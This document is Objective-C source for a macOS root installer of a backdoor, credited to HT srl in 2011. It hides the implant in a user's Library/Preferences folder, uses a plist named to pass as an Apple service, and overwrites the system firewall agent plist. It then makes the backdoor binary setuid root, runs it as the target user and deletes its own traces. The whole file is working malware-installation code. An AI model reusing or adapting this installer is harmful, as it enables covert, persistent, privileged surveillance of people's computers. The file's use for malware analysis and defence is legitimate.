/*
 * MacOS root installer
 * Root installer for online/offline installation
 * 
 * Created by Alfredo 'revenge' Pesoli on 30/03/2011
 * Copyright (C) HT srl 2011. All rights reserved
 */

#import <Foundation/Foundation.h>

#import <sys/stat.h>
#import <sys/types.h>
#import <pwd.h>

#define INSTALLER_PLIST @"com.apple.mdworkers.plist"


void executeTask(NSString *anAppPath,
                 NSArray *arguments,
                 BOOL waitForExecution)
{
  if ([[NSFileManager defaultManager] fileExistsAtPath: anAppPath] == NO)
    {
      return;
    }

  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];

  if (arguments != nil)
    [task setArguments: arguments];

  NSPipe *_pipe = [NSPipe pipe];
  [task setStandardOutput: _pipe];
  [task setStandardError:  _pipe];

  [task launch];

  if (waitForExecution == YES)
    [task waitUntilExit];

  [task release];
}

void restoreAlfPlist()
{
  NSString *alfPlistPath = [[NSString alloc] initWithFormat: @"%@/com.apple.alf.agent.plist",
            [[NSBundle mainBundle] bundlePath]];

  NSString *destAlfPlistPath = [[NSString alloc] initWithString:
    @"/System/Library/LaunchDaemons/com.apple.alf.agent.plist"];

  NSFileManager *_fileManager = [NSFileManager defaultManager];

  //
  // Remove the current alf agent plist
  //
  [_fileManager removeItemAtPath: destAlfPlistPath
                           error: nil];

  //
  // Copy it to destination
  //
  [_fileManager moveItemAtPath: alfPlistPath
                        toPath: destAlfPlistPath
                         error: nil];

  [alfPlistPath release];
  [destAlfPlistPath release];
}

void deleteCurrentDir()
{
  [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                             error: nil];
}

int main(int ac, char *av[])
{
  //
  // <username> <backdoor_dir_name> <backdoor_binary_name>
  //
  if (av[1] == NULL || av[2] == NULL || av[3] == NULL)
    return 0;

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSFileManager *_fileManager = [NSFileManager defaultManager];

  //
  // Parse Arguments
  //
  NSString *username = [[NSString alloc] initWithCString: av[1]
                                                encoding: NSUTF8StringEncoding];
  NSString *backdoorDir = [[NSString alloc] initWithCString: av[2]
                                                   encoding: NSUTF8StringEncoding];
  NSString *binary = [[NSString alloc] initWithCString: av[3]
                                              encoding: NSUTF8StringEncoding];

  NSString *destinationDir = [[NSString alloc] initWithFormat: @"/Users/%@/Library/Preferences/%@/",
                              username,
                              backdoorDir];
  [backdoorDir release];

  NSString *binaryPath = [[NSString alloc] initWithFormat: @"%@/%@",
           destinationDir,
           binary];

  //
  // Restore com.apple.alf.agent.plist
  //
  restoreAlfPlist();

  if ([_fileManager fileExistsAtPath: binaryPath])
    {
      //
      // In case the backdoor binary is already there delete our dir
      // and do nothing
      //
      deleteCurrentDir();

      return 0;
    }

  //
  // Create destination dir
  //
  mkdir([destinationDir UTF8String], 0755);

  //
  // Delete root LaunchDaemons plist
  //
  NSString *rootPlistPath = [[NSString alloc] initWithFormat: @"%@/%@",
           [[NSBundle mainBundle] bundlePath],
           INSTALLER_PLIST];

  [_fileManager removeItemAtPath: rootPlistPath
                           error: nil];
  [rootPlistPath release];

  //
  // Delete ourself in order to avoid to be copied in the next for cycle
  //
  [_fileManager removeItemAtPath: [[NSBundle mainBundle] executablePath]
                           error: nil];

  NSString *currentDir = [[NSString alloc] initWithFormat: @"%@",
           [[NSBundle mainBundle] bundlePath]];

  NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: currentDir
                                                          error: nil];

  int filesCount = [dirContent count];
  int i;

  for (i = 0; i < filesCount; i++)
    {
      NSString *fileName = [dirContent objectAtIndex: i];
      NSString *filePath = [NSString stringWithFormat:
        @"%@/%@", currentDir, fileName];
      NSString *destPath = [NSString stringWithFormat:
        @"%@/%@", destinationDir, fileName];

      //
      // Move every single file left to destPath
      //
      [_fileManager moveItemAtPath: filePath
                            toPath: destPath
                             error: nil];
    }

  [currentDir release];
  [binary release];
  [destinationDir release];

  NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                        @"root:wheel",
                        binaryPath,
                        nil];
  executeTask(@"/usr/sbin/chown", arguments, YES);
 
  //
  // suid binary
  //
  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: 0];

  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  nil];

  [_fileManager setAttributes: tempDictionary
                 ofItemAtPath: binaryPath
                        error: nil];

  arguments = [NSArray arrayWithObjects: @"-u",
               username,
               binaryPath,
               nil];
  //
  // Execute it as the user
  //
  executeTask(@"/usr/bin/sudo", arguments, NO);

  //
  // Delete current dir
  //
  [_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                           error: nil];

  [username release];
  [binaryPath release];
  [outerPool release];

  return 0;
}
